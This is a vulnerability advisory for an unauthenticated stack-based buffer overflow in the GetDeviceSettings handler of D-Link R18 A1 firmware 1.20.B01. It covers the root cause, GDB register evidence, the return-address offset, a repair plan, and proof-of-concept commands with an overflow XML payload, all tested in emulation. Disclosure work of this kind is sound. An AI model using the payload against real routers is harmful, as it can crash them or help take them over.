# D-Link R18 A1 `GetDeviceSettings` `Target` Unauthenticated Stack-Based Buffer Overflow

## Title

D-Link R18 A1 1.20.B01 DHMAPI `GetDeviceSettings` `Target` Unauthenticated Stack-Based Buffer Overflow

## Description

### 1. Vulnerability Name

An unauthenticated stack-based buffer overflow exists in the DHMAPI `GetDeviceSettings` action when the `Target` XML value is copied into a 36-byte stack buffer with `strcpy`.

### 2. Vulnerability Contributor and Submitter

- **Researcher**: Lumina
- **Contact**: 1547800591@qq.com

### 3. Vendor and Product Information

- **Vendor**: D-Link Corporation
- **Vendor homepage**: https://www.dlink.com/
- **Product**: D-Link R18 A1 Router Operating System
- **Component**: DHMAPI SOAP interface, `/bin/httpd`
- **Affected action**: `GetDeviceSettings`
- **Affected parameter**: `Target`
- **Vulnerable function**: `GetDeviceSettings_put`

![image-20261105190403142](R18A1-FW120B01-GetDeviceSettings-Target-stack-overflow.EN.assets/image-20261105190403142.png)

### 4. Affected Version

- **Firmware**: `1.20.B01` (`R18A1_FW120B01.bin`)
- **Runtime version string**: `1.20.01`
- **Firmware SHA-256**: `3d6eba2059034d4148543acb7894c81633ce406756287eba2573d323a785a01d`
- **Decrypted firmware SHA-256**: `11cfca751130b979bad3d00cb8b442bd91fd54c134b290070fed6b195a38db24`
- **`httpd` SHA-256**: `a73f1bf1a4cb8bc86d7b2e34a50dcb54dce559a001455b4f6942294b72f43cc3`
- **Architecture**: MIPS32 little-endian, uClibc, Linux 3.18.21

### 5. Vulnerability Class and Attack Conditions

- **Vulnerability class**: Stack-based buffer overflow
- **CWE**: CWE-121 (Stack-based Buffer Overflow)
- **Attack vector**: Adjacent network by default, or remote networks if the management interface is exposed
- **Authentication required**: No
- **User interaction required**: No
- **Confirmed impact**: Denial of service and saved-return-address control
- **Code execution status**: RCE risk exists, but a stable general-purpose RCE exploit was not established for this finding

### 6. Severity

An unauthenticated attacker can send one crafted DHMAPI request that corrupts the `httpd` stack and interrupts the Web management service. GDB confirmed control of `$pc`, `$ra`, and multiple saved registers. This is more serious than a routine parser error, although this report does not claim a completed arbitrary-code-execution exploit.

### 7. Vulnerability Description

The `GetDeviceSettings` handler processes XML nodes named `Target` and copies each value into a fixed-size stack buffer without checking its length. A 128-byte value is sufficient to overwrite saved control data. Cyclic testing placed saved `$ra` control at offset 68 from the beginning of the `Target` value.

The action table marks both `GetDeviceSettings` and `Login` as authentication-free. Consequently, no valid account, session cookie, or `API-CONTENT` value is needed to reach the vulnerable copy.

### 8. Technical Details and Root Cause

#### Unauthenticated action reachability

The HNAP/DHMAPI action table contains 192 entries. The authentication flag is `0` for `GetDeviceSettings` and `Login`; the other actions normally require authentication. The frontend sets `featureHNAPUsed=false`, making `/DHMAPI/` the effective route.

#### Vulnerable copy

`GetDeviceSettings_put` performs the equivalent of:

```c
char dest[36];
strcpy(dest, target_value);
sscanf(dest, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", ...);
++target_cnt;
```

There is no `Target` length validation before `strcpy`. The `target_cnt` array index also lacks a bounds check.

Relevant instructions include:

- `0x477ba8`: obtain the XML source value.
- `0x477bac`: resolve `strcpy`.
- `0x477bb0`: place the stack destination in `$a0`.
- The following indirect call invokes `strcpy` without a length limit.

#### Control-flow evidence

With a repeated-character overflow, GDB observed:

```text
Thread 2.2 "httpd" received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
s0-s7 = 0x41414141
ra     = 0x41414141
pc     = 0x41414141
```

With cyclic input, `$pc=$ra=0x61616172`, corresponding to offset 68. An attempted libc ROP approach was not reliable with ASLR; that failed attempt is not presented as successful exploitation.

### 9. Proof of Concept

The self-contained Python 3 exploit requires no third-party packages. It first sends a valid MAC-shaped `Target` and requires an HTTP 200/`OK` control response, then sends a 128-byte overflow value:

```bash
python3 ./r18_f2_getdevicesettings_overflow.py
```

The default target is the authorized forwarded emulation endpoint `192.168.135.137:18080`. For direct access inside the VM:

```bash
python3 ./r18_f2_getdevicesettings_overflow.py \
  --host 192.168.0.1 --web-port 80
```

A different test length can be selected explicitly:

```bash
python3 ./r18_f2_getdevicesettings_overflow.py --length 128
```

The essential XML input is:

```xml
<soap:Body>
  <GetDeviceSettings>
    <Target>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...</Target>
  </GetDeviceSettings>
</soap:Body>
```

Observed result from the final host-side test:

```text
[*] Normal Target: HTTP 200
[+] Overflow request caused RemoteDisconnected: Remote end closed connection without response
[*] Web service after overflow: RemoteDisconnected: Remote end closed connection without response
[+] F2 overflow input was delivered; GDB evidence establishes saved-RA control at offset 68
```

![image-20261105191935853](R18A1-FW120B01-GetDeviceSettings-Target-stack-overflow.EN.assets/image-20261105191935853.png)

### 10. Impact

The confirmed impact is unauthenticated denial of the Web management backend and control of MIPS saved control registers. Depending on available exploit primitives, mitigations, address disclosures, and device configuration, this defect may support remote code execution. 

### 11. Repair Plan

1. Replace `strcpy` with strict format validation and bounded copying; accept only a valid MAC-length `Target`.
2. Validate both the number and length of `Target` nodes before parsing them.
3. Add bounds checks for `target_cnt` and all associated global arrays.
4. Enable stack protectors, PIE, and ASLR, and fuzz all authentication-free DHMAPI actions.
5. Return a controlled client error on malformed input rather than continuing after stack corruption.

### 12. Verification and Disclosure Notes

- **Evidence level**: GDB_CONFIRMED for saved-control-flow hijacking, with runtime denial-of-service observation.
- The Web frontend and original `httpd` backend were running in full-system FirmAE/QEMU emulation.
- The vulnerable copy was not patched. The final one-click exploit was tested through the VM forwarding endpoint.

The following supporting file is attached:

- `exploits/r18_f2_getdevicesettings_overflow.py` — self-contained one-click control and overflow PoC.
